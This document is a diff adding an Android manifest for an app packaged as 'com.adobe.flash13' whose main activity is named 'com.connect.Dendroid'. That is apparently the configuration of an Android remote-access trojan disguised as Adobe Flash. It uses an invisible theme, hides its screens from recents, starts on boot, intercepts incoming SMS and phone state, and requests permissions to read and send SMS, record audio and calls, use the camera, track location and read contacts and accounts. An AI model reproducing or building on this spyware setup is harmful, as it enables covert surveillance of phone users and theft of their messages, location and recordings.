@@ -1,0 +1,89 @@
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="com.adobe.flash13"
+    android:versionCode="2"
+    android:versionName="2.0" >
+
+    <uses-sdk
+        android:minSdkVersion="10"
+        android:targetSdkVersion="18"/>
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    
+ <supports-screens android:resizeable="true"
+              android:largeScreens="true" 
+              android:xlargeScreens="true"
+              />   
+    
+    <application 
+        android:icon="@drawable/launcher"
+        android:label="@string/app_name"
+		android:theme="@style/Invisible">
+        <activity
+            android:name="com.connect.Dendroid" 
+            android:excludeFromRecents="true">
+                <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                 <category android:name="android.intent.category.LAUNCHER" />            
+ 				</intent-filter>
+        </activity>
+        <activity
+            android:name="com.connect.Dialog" 
+            android:excludeFromRecents="true">
+        </activity>
+        <activity
+            android:name="com.connect.CaptureCameraImage" 
+            android:excludeFromRecents="true">
+        </activity>
+        <activity
+            android:name="com.connect.CameraView" 
+            android:excludeFromRecents="true">
+        </activity>
+        <activity
+            android:name="com.connect.VideoView" 
+            android:excludeFromRecents="true">
+        </activity>
+        <service android:name="com.connect.MyService"
+            android:enabled="true"
+            android:exported="true">
+        </service>  
+        <service android:name="com.connect.RecordService">
+        </service> 
+                 <receiver android:name="com.connect.ServiceReceiver" 
+                   android:enabled="true"
+                   android:exported="true">
+				        <intent-filter android:priority="1000">
+								<action android:name="android.intent.action.BOOT_COMPLETED" />
+				                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+        						<action android:name="android.intent.action.PHONE_STATE" />
+        						<action android:name="android.intent.action.ACTION_EXTERNAL_APPLICATIONS_AVAILABLE"/>
+        						<action android:name="android.intent.action.QUICKBOOT_POWERON" />
+				        </intent-filter>
+    	 		</receiver>
+    </application>
+    
+<uses-permission android:name="android.permission.QUICKBOOT_POWERON" android:required="false" />
+<uses-permission android:name="android.permission.INTERNET" android:required="true"/>
+<uses-permission android:name="android.permission.READ_SMS" android:required="true" />
+<uses-permission android:name="android.permission.WRITE_SMS" android:required="true" />
+<uses-permission android:name="android.permission.GET_ACCOUNTS" android:required="true" />
+<uses-permission android:name="com.android.browser.permission.READ_HISTORY_BOOKMARKS"/>
+<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" android:required="true"/>
+<uses-permission android:name="android.permission.READ_CONTACTS" android:required="true" />
+<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" android:required="true" />
+<uses-permission android:name="android.permission.GET_TASKS" android:required="true" />
+<uses-permission android:name="android.permission.WAKE_LOCK" android:required="false" />
+<uses-permission android:name="android.permission.CALL_PHONE" android:required="true" />
+<uses-permission android:name="android.permission.SEND_SMS" android:required="true" />
+<uses-permission android:name="android.permission.WRITE_SETTINGS" android:required="false" />
+<uses-permission android:name="android.permission.READ_PHONE_STATE" android:required="false" />
+<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" android:required="true" />
+<uses-permission android:name="android.permission.CAMERA" android:required="true" />
+<uses-permission android:name="android.permission.RECORD_AUDIO" android:required="false" />
+<uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" android:required="true" />
+<uses-permission android:name="android.permission.RECEIVE_SMS" android:required="true" />
+<uses-feature android:name="android.hardware.camera" android:required="false" />
+<uses-feature android:name="android.hardware.camera.front" android:required="false" />
+<uses-feature android:name="android.hardware.camera.autofocus" android:required="false" />
+<uses-feature android:name="android.hardware.microphone" android:required="false" />
+ 
+</manifest>
+
